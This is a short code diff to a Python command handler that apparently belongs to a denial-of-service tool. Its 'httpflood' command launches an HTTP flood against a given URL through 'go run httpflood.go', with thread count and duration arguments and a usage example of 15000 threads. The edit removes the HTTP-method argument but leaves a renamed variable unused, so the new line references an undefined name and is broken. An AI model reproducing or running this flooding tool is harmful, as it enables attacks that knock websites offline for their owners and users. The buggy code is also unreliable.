@@ -610,13 +610,12 @@ def main():
         elif "httpflood" in cnc:
             try:
                 url = cnc.split()[1]
-                thread = cnc.split()[2]
-                method = cnc.split()[3]
-                time = cnc.split()[4]
-                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+                threads = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'go run httpflood.go {url} {thread} get {time} nil')
             except IndexError:
-                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('Usage: httpflood <url> <threads> <time>')
+                print('Example: httpflood http://example.com 15000 60')
 
         elif "httpget" in cnc:
             try:
